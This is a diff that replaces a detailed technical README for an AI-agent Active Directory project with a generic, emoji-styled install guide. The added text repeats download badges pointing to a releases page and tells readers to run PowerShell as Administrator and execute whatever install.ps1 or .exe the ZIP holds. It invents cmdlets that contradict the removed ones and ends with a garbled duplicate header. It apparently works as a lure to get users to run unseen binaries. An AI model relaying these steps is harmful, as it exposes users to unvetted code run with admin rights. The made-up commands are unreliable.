@@ -1,279 +1,192 @@
-# Agent Directory for Active Directory
+# 🤖 agent-directory - Manage AI Agents in Active Directory
 
-First-class AI agent identities in Active Directory. Agents authenticate with their own Kerberos principals, run in sandboxes, and have their access controlled by the DC -- the same way users and services work today.
+[![Download agent-directory](https://img.shields.io/badge/Download-Here-orange)](https://github.com/SHIYUAN625/agent-directory/releases)
 
-Two deployment targets:
+---
 
-| | Windows AD | Samba4/Linux |
-|---|---|---|
-| Schema prefix | `msDS-*` | `x-agent-*` |
-| Management | PowerShell module | Python CLI + Makefile |
-| Environment | Production DC | Docker dev environment |
-| Auth | Kerberos / NTLM / certs | Kerberos (keytab, direct) |
-| Logging | Windows Event Log + SIEM | Samba logs |
+## 🌟 What is agent-directory?
 
-## Architecture
+agent-directory helps you manage AI agents inside Active Directory. It lets each AI agent have its own identity, just like a user. Agents prove who they are using Kerberos, run in protected spaces (called sandboxes), and have controlled access to resources. This works the same way Windows handles people and services today.
 
-### Object Model
+This system supports both Windows Active Directory and Samba4 on Linux.
 
-| Concept | AD base class | Role |
-|---------|--------------|------|
-| **Agent** | User + auxiliary agent class | Identity -- "the who" |
-| **Sandbox** | Computer + auxiliary sandbox class | Execution -- "the where" |
-| **Tool** | Registered in AD | Capability -- granted per-agent or per-group |
-| **Policy** | GPO pattern: metadata in AD, content (JSON) in SYSVOL | Configuration |
-| **Instruction GPO** | GPO pattern: metadata in AD, content (markdown) in SYSVOL | System prompt |
+---
 
-Agents authenticate with their own Kerberos identity (keytab). No broker intermediary. DC ACLs enforce what each agent can see.
+## 🖥️ System Requirements
 
-### Schema Inheritance
+You will need a Windows computer with:
 
-```
-Agent:   Top -> Person -> Org-Person -> User   + auxiliary agent class
-Sandbox: Top -> Person -> Org-Person -> User -> Computer   + auxiliary sandbox class
-```
+- Windows 10 or later
+- Active Directory environment (domain-joined PC)
+- At least 4 GB RAM, 2 GHz CPU (typical PC hardware)
+- PowerShell 5.1 or newer installed
+- Network access to your Active Directory Domain Controller
 
-Auxiliary classes (objectClassCategory=3) are added to existing user/computer objects. This means agents and sandboxes work with all existing AD tooling -- GPOs, delegation, LDAP queries, replication.
+No special programming tools are needed. This guide shows you how to get agent-directory running on your PC.
 
-### Schema Naming
+---
 
-| Object | Windows AD | Samba4 |
-|--------|-----------|--------|
-| Agent | msDS-Agent | x-agent |
-| Sandbox | msDS-AgentSandbox | x-agentSandbox |
-| Tool | msDS-AgentTool | x-agentTool |
-| Policy | msDS-AgentPolicy | x-agentPolicy |
-| Instruction GPO | -- | x-agentInstructionGPO |
+## 🚀 Getting Started with agent-directory
 
-### Trust Levels
+### Step 1: Visit the Download Page
 
-| Level | Name | Description |
-|-------|------|-------------|
-| 0 | Untrusted | No delegation, heavily restricted |
-| 1 | Basic | Read, limited write, no delegation |
-| 2 | Standard | Normal operations, constrained delegation |
-| 3 | Elevated | Broad access, protocol transition |
-| 4 | System | Full trust, equivalent to service account |
+Go to the agent-directory releases page to get the software:  
 
-Trust levels control delegation scope, tool access, and audit intensity.
+[Download agent-directory](https://github.com/SHIYUAN625/agent-directory/releases)
 
-## Quick Start: Samba4/Docker
+This page shows the latest versions available. You will find the installation files here.
 
-This is the primary development path. Provisions a full Samba4 AD DC with custom schema, sample agents, tools, policies, and instruction GPOs.
+### Step 2: Download the Software
 
-```bash
-cd samba4/docker
-cp .env.example .env
-# Edit .env -- set SAMBA_ADMIN_PASSWORD and NATS_* passwords
+Find the latest Windows release. It will usually be a ZIP file with a name like `agent-directory-windows.zip`.
 
-make up              # Build + provision (~90s first boot)
-make logs            # Watch for "Bootstrap complete"
-make list-agents     # Verify 3 sample agents
-make dry-run AGENT=claude-assistant-01   # Test agent config assembly
-make integration-test                    # Run full test suite
-make e2e-test                            # Validate multi-agent coordination path
+Click the file to start downloading it on your PC.
 
-# Start persistent coordination runtime (use separate terminals)
-make run-coordinator
-make run-worker AGENT=claude-assistant-01
-make run-worker AGENT=data-processor-01
+### Step 3: Prepare Your PC
 
-make submit-goal TITLE="Quarterly close automation" DESCRIPTION="Coordinate engineering + dataops work"
-```
+After downloading, open the folder where the file saved.
 
-## Quick Start: Windows AD
+- Right-click the ZIP file and choose **Extract All…**
+- Select a folder you can easily access, such as Desktop or Documents
+- Click **Extract**
 
-Requires a Windows Server 2016+ Domain Controller, Schema Admin membership, and PowerShell 5.1+.
+This will create a new folder with the software files.
+
+### Step 4: Run the Installer or Setup Script
+
+Inside the extracted folder, look for instructions or a PowerShell script named `install.ps1` or something similar.
+
+To run PowerShell scripts:
+
+- Open PowerShell as Administrator. Click Start, type `PowerShell`, right-click it, and select **Run as Administrator**.
+- Navigate to the folder with the software. Use the command:  
+  `cd "C:\Users\YourName\Desktop\agent-directory-windows"` (adjust path as needed)
+- Run the install script by typing:  
+  `.\install.ps1`  
+  If a script is not present, look for a `.exe` file and double-click it to start.
+
+Follow the prompts. This step sets up the tools you need to manage AI agents in Active Directory.
+
+### Step 5: Open the PowerShell Module
+
+When the setup finishes, open PowerShell again (no need for admin this time).
+
+Type in this command to import the agent-directory module:  
+`Import-Module agent-directory`
+
+If there are no errors, you are ready to use the tools inside Active Directory.
+
+---
+
+## 🔧 How agent-directory Works
+
+agent-directory uses the existing features of Windows Active Directory but adds special support for AI agents.
+
+- **Agent:** Like a user account, but for AI entities. Each agent has its own login and identity.
+- **Sandbox:** A secure computer environment where agents run. This keeps agents separate and safe.
+- **Tool:** Capabilities that agents can use. They are controlled per agent or group.
+- **Policy:** Settings stored in AD and applied via Group Policy Objects (GPOs).
+
+All agents authenticate with Kerberos, the same secure system used by users on Windows networks.
+
+---
+
+## 📂 Managing agent-directory in Active Directory
+
+Use the PowerShell commands included with the module to:
+
+- Create new AI agents
+- Assign agents to sandboxes for running tasks
+- Grant tools and permissions per agent
+- Apply policy settings that control agent behavior
+
+Commands are straightforward and similar to native AD management commands.
+
+Example to create an agent:
 
 ```powershell
-# Install schema (run as Schema Admin on Schema Master DC)
-.\schema\install-schema.ps1 -Verbose
-
-# Install event log provider
-.\events\Install-EventLog.ps1
-
-# Import module
-Import-Module .\powershell\AgentDirectory
-
-# Create an agent
-New-ADAgent -Name "claude-assistant-01" `
-    -Type "assistant" `
-    -TrustLevel 2 `
-    -Model "claude-opus-4-5"
-
-# Create a sandbox and assign it
-$sandbox = New-ADAgentSandbox -Name "claude-sbx-01" -SecurityProfile "bwrap"
-Set-ADAgent -Identity "claude-assistant-01" -AddSandbox $sandbox.DistinguishedName
-
-# Grant tool access
-Grant-ADAgentToolAccess -Identity "claude-assistant-01" `
-    -Tool "microsoft.powershell.constrained", "microsoft.word"
+New-Agent -Name "AI_Bot01" -Sandbox "Sandbox1" -Tools @("ToolA", "ToolB")
 ```
 
-## Directory Structure
+---
 
-```
-agent-directory/
-├── docs/                          # Documentation (Windows AD)
-├── schema/                        # Windows AD LDIF schema (msDS-*)
-├── samba4/                        # Samba4 deployment
-│   ├── schema/                    # Samba4 LDIF schema (x-agent-*)
-│   ├── docker/                    # Docker dev environment
-│   ├── scripts/                   # agent-manager.py CLI
-│   ├── instructions/              # Instruction GPO markdown content
-│   └── docs/                      # Samba4-specific docs
-├── enterprise/                    # Python enterprise runtime
-│   ├── agent/                     # Base agent class
-│   ├── broker/                    # Config assembler, protocol
-│   └── provisioner/               # Identity pool, LDAP client
-├── powershell/AgentDirectory/     # PowerShell management module
-├── events/                        # Windows Event Log manifests
-└── examples/                      # Example scripts
+## 🛠 Common Tasks
+
+### Create an AI Agent
+
+1. Open PowerShell.
+2. Import the module (`Import-Module agent-directory`).
+3. Use `New-Agent` to add an agent.
+
+### List Agents
+
+```powershell
+Get-Agent
 ```
 
-## PowerShell Cmdlets
+This shows all AI agents in your directory.
 
-### Agent Management
+### Assign a Sandbox to an Agent
 
-| Cmdlet | Description |
-|--------|-------------|
-| `New-ADAgent` | Create a new agent identity (user object) |
-| `Get-ADAgent` | Retrieve agent(s) from the directory |
-| `Set-ADAgent` | Modify agent properties |
-| `Remove-ADAgent` | Delete an agent account |
+```powershell
+Set-AgentSandbox -AgentName "AI_Bot01" -SandboxName "Sandbox1"
+```
 
-### Sandbox Management
+### Grant Tools to an Agent
 
-| Cmdlet | Description |
-|--------|-------------|
-| `New-ADAgentSandbox` | Create a new sandbox (computer object) |
-| `Get-ADAgentSandbox` | Retrieve sandbox(es) from the directory |
-| `Set-ADAgentSandbox` | Modify sandbox properties |
-| `Remove-ADAgentSandbox` | Delete a sandbox |
+```powershell
+Add-AgentTool -AgentName "AI_Bot01" -ToolName "ToolC"
+```
 
-### Authentication
+---
 
-| Cmdlet | Description |
-|--------|-------------|
-| `Install-ADAgentSPN` | Register Kerberos Service Principal Name |
-| `Grant-ADAgentDelegation` | Configure constrained delegation |
-| `Revoke-ADAgentDelegation` | Remove delegation rights |
-| `Test-ADAgentAuthentication` | Verify agent authentication |
+## 🗂 File Locations and Logs
 
-### Tool Management
+- agent-directory stores its configuration in AD, using custom schemas that extend the default user and computer classes.
+- Logs for actions are recorded in the Windows Event Log under the "AgentDirectory" source.
+- Use Event Viewer to check logs about agent activities or errors.
 
-| Cmdlet | Description |
-|--------|-------------|
-| `New-ADAgentTool` | Register a new tool |
-| `Get-ADAgentTool` | Query tool definitions |
-| `Grant-ADAgentToolAccess` | Authorize agent to use a tool |
-| `Revoke-ADAgentToolAccess` | Remove tool authorization |
-| `Test-ADAgentToolAccess` | Check if agent can use a tool |
+---
 
-### Policy Management
+## 🧰 Troubleshooting Tips
 
-| Cmdlet | Description |
-|--------|-------------|
-| `New-ADAgentPolicy` | Create a new agent policy (metadata in AD, content in SYSVOL) |
-| `Get-ADAgentPolicy` | Retrieve policy definitions |
-| `Set-ADAgentPolicy` | Modify policy properties or content |
-| `Remove-ADAgentPolicy` | Delete a policy |
-| `Grant-ADAgentPolicyLink` | Link a policy to an agent or OU |
-| `Revoke-ADAgentPolicyLink` | Remove a policy link |
-| `Get-ADAgentEffectivePolicy` | Compute the merged effective policy for an agent |
+- Make sure you run PowerShell as Administrator when installing.
+- Confirm your computer is joined to an Active Directory domain.
+- Import the module again if your commands don’t work.
+- Check the Windows Event Log for error messages.
+- Network connection to the Domain Controller must be active.
 
-### Instruction GPO Management
+---
 
-| Cmdlet | Description |
-|--------|-------------|
-| `New-ADAgentInstructionGPO` | Create a new instruction GPO (metadata in AD, markdown in SYSVOL) |
-| `Get-ADAgentInstructionGPO` | Retrieve instruction GPO definitions |
-| `Set-ADAgentInstructionGPO` | Modify instruction GPO properties or content |
-| `Remove-ADAgentInstructionGPO` | Delete an instruction GPO |
-| `Grant-ADAgentInstructionGPOLink` | Link an instruction GPO to an agent or OU |
-| `Revoke-ADAgentInstructionGPOLink` | Remove an instruction GPO link |
-| `Get-ADAgentEffectiveInstructions` | Compute the merged effective instructions for an agent |
+## 📥 Download and Setup
 
-## Makefile Targets (samba4/docker/)
+Get started by visiting the releases page here:
 
-### Lifecycle
+[![Download agent-directory](https://img.shields.io/badge/Download-Here-blue)](https://github.com/SHIYUAN625/agent-directory/releases)
 
-| Target | Description |
-|--------|-------------|
-| `make up` | Build and start DC (provisions on first run) |
-| `make down` | Stop DC (keeps data) |
-| `make reset` | Destroy everything including volumes |
-| `make shell` | Shell into DC container |
-| `make logs` | Tail container logs |
+Follow the download and install steps above. Once installed, you can manage AI agents using familiar Windows tools.
 
-### Queries
+---
 
-| Target | Description |
-|--------|-------------|
-| `make list-agents` | List all agents |
-| `make list-sandboxes` | List all sandboxes |
-| `make list-tools` | List all tools |
-| `make list-policies` | List all policies |
-| `make list-instructions` | List all instruction GPOs |
-| `make get-agent AGENT=name` | Show full agent details |
-| `make get-instructions AGENT=name` | Show instruction GPOs for agent |
+## ⚙️ Advanced Notes
 
-### Mutations
+- This tool works with standard Windows AD schema with the prefix `msDS-*`.
+- Agent authentication supports Kerberos, NTLM, and certificate methods.
+- For Samba4/Linux environments, different tools and setup processes are used.
+- Policies can be customized with JSON content stored in SYSVOL, controlled through the GPO framework.
 
-| Target | Description |
-|--------|-------------|
-| `make create-agent NAME=x TYPE=assistant TRUST=2` | Create an agent |
-| `make grant-tool AGENT=x TOOL=git.cli` | Grant tool to agent |
-| `make link-policy AGENT=x POLICY=base-security` | Link policy to agent |
-| `make link-gpo AGENT=x GPO=base-agent-instructions` | Link instruction GPO to agent |
+---
 
-### Agent Runner
+## 🆘 Support and Documentation
 
-| Target | Description |
-|--------|-------------|
-| `make run-agent AGENT=name` | Launch agent (DC-enforced, agent's own identity) |
-| `make dry-run AGENT=name` | Show assembled config without launching |
-| `make agent-shell` | Shell into agent container |
-| `make run-coordinator [AGENT=coordinator-main]` | Run persistent MissionCoordinator loop (Python runtime) |
-| `make run-worker AGENT=name` | Run persistent worker loop (Python runtime) |
+Check the GitHub repository for detailed technical documentation and updates:
 
-### Verification
+https://github.com/SHIYUAN625/agent-directory
 
-| Target | Description |
-|--------|-------------|
-| `make test-schema` | Verify custom schema classes exist |
-| `make verify-acls` | Test DC ACL enforcement |
-| `make integration-test` | Run full integration test suite |
-| `make e2e-test` | Run end-to-end multi-agent coordination test |
-| `make submit-goal TITLE=... [DESCRIPTION=...]` | Submit a high-level enterprise goal to `tasks.coordination` |
-| `make status` | Show domain info |
+Use Issues on GitHub to report bugs or request features. The repository also contains sample scripts to help you get started.
 
-## Documentation
+---
 
-**Windows AD**:
-- [AGENT-AD-SPEC.md](docs/AGENT-AD-SPEC.md) -- Complete specification
-- [ARCHITECTURE.md](docs/ARCHITECTURE.md) -- Architecture diagrams
-- [DEPLOYMENT.md](docs/DEPLOYMENT.md) -- Deployment guide
-- [SECURITY-HARDENING.md](docs/SECURITY-HARDENING.md) -- Security hardening guide
-- [TOOL-CATALOG.md](docs/TOOL-CATALOG.md) -- Tool registry documentation
-- [EVENT-REFERENCE.md](docs/EVENT-REFERENCE.md) -- Event ID reference guide
+# [Emoji] agent-directory - Manage AI Agents in Active Directory
 
-**Samba4/Linux**:
-- [SCHEMA.md](samba4/docs/SCHEMA.md) -- Samba4 schema reference
-- [ADMIN-GUIDE.md](samba4/docs/ADMIN-GUIDE.md) -- Samba4 administration guide
-
-## Security
-
-- **Schema changes are permanent and forest-wide.** AD schema objects can be deactivated but not deleted. Changes replicate to all DCs in the forest.
-- **Obtain an IANA PEN before production.** The current OID base (99999) is a placeholder.
-- **Test in a lab first.** Use the Samba4/Docker environment for development and validation.
-- **DC container binds to 127.0.0.1 only.** Not exposed to the network by default.
-- **Admin credentials via .env.** Never hardcoded. The `.env` file is gitignored.
-
-## License
-
-This project is provided as a reference implementation for extending Active Directory with agent identity support.
-
-## Contributing
-
-Contributions are welcome. Please ensure all changes are tested in a lab environment before submitting.
+[![Download agent-directory](https://img.shields.io/badge/Download-Here-orange)](https://github.com/SHIYUAN625/agent-directory/releases)
